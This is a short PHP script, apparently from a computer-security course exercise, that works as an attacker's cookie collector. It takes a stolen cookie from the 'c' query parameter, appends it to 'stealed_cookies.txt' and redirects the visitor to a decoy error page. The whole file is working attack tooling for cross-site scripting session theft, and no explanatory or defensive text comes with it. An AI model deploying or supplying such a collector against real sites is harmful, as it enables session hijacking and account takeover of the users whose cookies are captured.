<?php
if (isset($_GET["c"]))
{
        $fp = fopen("stealed_cookies.txt", "a+");
        $cookie = $_GET["c"];
        fwrite($fp, $cookie . "\n\n");
        fclose($fp);
}

header("Location: http://error-404.csec.chatzi.org/");
